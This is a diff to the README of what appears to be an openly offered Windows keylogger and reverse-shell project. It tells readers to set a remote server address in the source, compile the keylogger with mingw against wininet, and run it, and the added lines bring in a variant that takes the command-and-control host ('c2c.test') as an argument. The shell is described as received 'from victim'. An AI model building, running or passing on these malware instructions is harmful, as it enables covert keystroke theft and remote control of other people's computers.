@@ -22,6 +22,12 @@ sudo apt-get install mingw-w64 -y
 ***Note:*** *Inspect source in virus.cpp and change sourceip and port to your remote server that hosts server.py (receive shell from victim) then build it using mingw*
 ```bash
 x86_64-w64-mingw32-g++ -o logger.exe mainkeylogger.cpp -static-libgcc -static-libstdc++ -luser32 -lwininet
+.\logger.exe
+```
+***Update*** *I change remote server to dynamic, meaning you can add it through args (not hard-code anymore but it doesn't hide the console).*
+```bash
+x86_64-w64-mingw32-g++ -o logger_arg.exe mainkeylogger_arg.cpp -static-libgcc -static-libstdc++ -luser32 -lwininet
+.\logger_arg.exe c2c.test
 ```
 
 ### 2. Run listening server
